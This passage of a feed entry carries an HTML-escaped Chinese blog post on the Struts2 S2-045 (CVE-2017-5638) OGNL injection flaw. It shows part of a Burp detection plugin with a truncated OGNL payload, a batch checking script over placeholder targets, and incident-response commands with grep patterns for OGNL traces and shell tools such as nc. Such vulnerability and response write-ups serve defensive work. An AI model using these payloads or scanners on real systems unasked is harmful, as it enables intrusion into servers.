class=&#34;hljs-variable&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%&amp;#123;(#nike=&amp;#x27;multipart/form-data&amp;#x27;)...&amp;#125;&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;br&gt;        &lt;span class=&#34;hljs-comment&#34;&gt;// 发送测试请求&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-type&#34;&gt;byte&lt;/span&gt;[] checkRequest = insertionPoint.buildRequest(payload.getBytes());&lt;br&gt;        &lt;span class=&#34;hljs-type&#34;&gt;IHttpRequestResponse&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;checkRequestResponse&lt;/span&gt; &lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt; callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);&lt;br&gt;        &lt;br&gt;        &lt;span class=&#34;hljs-comment&#34;&gt;// 分析响应判断是否存在漏洞&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (isVulnerable(checkRequestResponse)) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; Collections.singletonList(&lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;CustomScanIssue&lt;/span&gt;(&lt;span class=&#34;hljs-comment&#34;&gt;/* ... */&lt;/span&gt;));&lt;br&gt;        &amp;#125;&lt;br&gt;        &lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;;&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;批量检测脚本&#34;&gt;&lt;a href=&#34;#批量检测脚本&#34; class=&#34;headerlink&#34; title=&#34;批量检测脚本&#34;&gt;&lt;/a&gt;批量检测脚本&lt;/h3&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#!/bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# S2-045批量检测脚本&lt;/span&gt;&lt;br&gt;&lt;br&gt;targets=(&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://target1.com:8080&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://target2.com:8080&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://target3.com:8080&amp;quot;&lt;/span&gt;&lt;br&gt;)&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; target &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;span class=&#34;hljs-variable&#34;&gt;$&amp;#123;targets[@]&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;; &lt;span class=&#34;hljs-keyword&#34;&gt;do&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Testing: &lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;    python3 s2-045-check.py &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;---&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;done&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;应急响应指南&#34;&gt;&lt;a href=&#34;#应急响应指南&#34; class=&#34;headerlink&#34; title=&#34;应急响应指南&#34;&gt;&lt;/a&gt;应急响应指南&lt;/h2&gt;&lt;h3 id=&#34;1-漏洞确认&#34;&gt;&lt;a href=&#34;#1-漏洞确认&#34; class=&#34;headerlink&#34; title=&#34;1. 漏洞确认&#34;&gt;&lt;/a&gt;1. 漏洞确认&lt;/h3&gt;&lt;figure class=&#34;highlight gradle&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs gradle&#34;&gt;# 检查Struts2版本&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;find&lt;/span&gt; &lt;span class=&#34;hljs-regexp&#34;&gt;/ -name &amp;quot;struts2-core-*.jar&amp;quot; 2&amp;gt;/&lt;/span&gt;dev/&lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;&lt;br&gt;&lt;br&gt;# 检查访问日志中的攻击特征&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;grep&lt;/span&gt; -E &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Content-Type.*%\&amp;#123;&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;log&lt;span class=&#34;hljs-regexp&#34;&gt;/apache2/&lt;/span&gt;access.log&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;grep&lt;/span&gt; -E &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;ognl|ProcessBuilder|Runtime&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;log&lt;span class=&#34;hljs-regexp&#34;&gt;/tomcat/&lt;/span&gt;catalina.out&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;2-应急处置&#34;&gt;&lt;a href=&#34;#2-应急处置&#34; class=&#34;headerlink&#34; title=&#34;2. 应急处置&#34;&gt;&lt;/a&gt;2. 应急处置&lt;/h3&gt;&lt;figure class=&#34;highlight sas&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs sas&#34;&gt;# 临时阻断攻击IP&lt;br&gt;iptables -A &lt;span class=&#34;hljs-keyword&#34;&gt;INPUT&lt;/span&gt; -s &amp;lt;攻击IP&amp;gt; -j &lt;span class=&#34;hljs-keyword&#34;&gt;DROP&lt;/span&gt;&lt;br&gt;&lt;br&gt;# 停止相关服务&lt;br&gt;systemctl &lt;span class=&#34;hljs-keyword&#34;&gt;stop&lt;/span&gt; tomcat&lt;br&gt;systemctl &lt;span class=&#34;hljs-keyword&#34;&gt;stop&lt;/span&gt; apache2&lt;br&gt;&lt;br&gt;# 备份系统状态&lt;br&gt;tar -czf /tmp/system_backup_$(date +&lt;span class=&#34;hljs-title function_&#34;&gt;%Y&lt;/span&gt;&lt;span class=&#34;hljs-title function_&#34;&gt;%m&lt;/span&gt;&lt;span class=&#34;hljs-title function_&#34;&gt;%d_&lt;/span&gt;&lt;span class=&#34;hljs-title function_&#34;&gt;%H&lt;/span&gt;&lt;span class=&#34;hljs-title function_&#34;&gt;%M&lt;/span&gt;&lt;span class=&#34;hljs-title function_&#34;&gt;%S&lt;/span&gt;).tar.gz /var/log /etc /opt/tomcat&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;3-痕迹清理检查&#34;&gt;&lt;a href=&#34;#3-痕迹清理检查&#34; class=&#34;headerlink&#34; title=&#34;3. 痕迹清理检查&#34;&gt;&lt;/a&gt;3. 痕迹清理检查&lt;/h3&gt;&lt;figure class=&#34;highlight vim&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs vim&#34;&gt;# 检查是否有异常进程&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;ps&lt;/span&gt; aux | &lt;span class=&#34;hljs-keyword&#34;&gt;grep&lt;/span&gt; -E &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;nc|bash|sh|python|perl&amp;quot;&lt;/span&gt; | &lt;span class=&#34;hljs-keyword&#34;&gt;grep&lt;/span&gt; -v &lt;span class=&#34;hljs-keyword&#34;&gt;grep&lt;/span&gt;&lt;br&gt;&lt;br&gt;# 检查网络连接&lt;br&gt;netstat -antlp | &lt;span class=&#34;hljs-keyword&#34;&gt;grep&lt;/span&gt; ESTABLISHED&lt;br&gt;&lt;br&gt;# 检查新增文件&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;find&lt;/span&gt; /tmp /var/tmp -&lt;span class=&#34;hljs-built_in&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;f&lt;/span&gt; -mtime -&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;find&lt;/span&gt; /&lt;span class=&#34;hljs-keyword&#34;&gt;opt&lt;/span&gt;/tomcat/webapps -name &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;*.jsp&amp;quot;&lt;/span&gt; -mtime -&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;总结&#34;&gt;&lt;a href=&#34;#总结&#34; class=&#34;headerlink&#34; title=&#34;总结&#34;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;Struts2-045漏洞的特点：&lt;/p&gt;
&lt;h3 id=&#34;优势（从攻击者角度）&#34;&gt;&lt;a href=&#34;#优势（从攻击者角度）&#34; class=&#34;headerlink&#34; title=&#34;优势（从攻击者角度）&#34;&gt;&lt;/a&gt;优势（从攻击者角度）&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;利用简单&lt;/strong&gt;: 只需构造HTTP请求头即可&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;影响面广&lt;/strong&gt;: 大量企业级应用使用Struts2框架&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;检测困难&lt;/strong&gt;: 攻击流量可能被忽略&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;危害严重&lt;/strong&gt;: 直接获得服务器执行权限&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;防护要点&#34;&gt;&lt;a href=&#34;#防护要点&#34; class=&#34;headerlink&#34; title=&#34;防护要点&#34;&gt;&lt;/a&gt;防护要点&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;及时更新&lt;/strong&gt;: 升级到安全版本是根本解决方案&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;深度防御&lt;/strong&gt;: 结合WAF、IDS等多层防护&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;监控告警&lt;/strong&gt;: 建立有效的安全监控体系&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;应急响应&lt;/strong&gt;: 制定完善的安全事件响应流程&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;免责声明&lt;/strong&gt;: 本文内容仅供安全研究和防护参考，请勿用于非法攻击活动。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;参考资源&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://struts.apache.org/announce.html#a20170307&#34;&gt;Apache Struts2官方安全公告&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638&#34;&gt;CVE-2017-5638详细信息&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://owasp.org/www-project-top-ten/&#34;&gt;OWASP Struts2安全指南&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
        <category term="Web安全" />
        <category term="Struts2" />
        <category term="RCE" />
        <category term="漏洞复现" />
        <category term="OGNL注入" />
        <updated>2025-07-24T00:10:34.000Z</updated>
    </entry>
</feed>
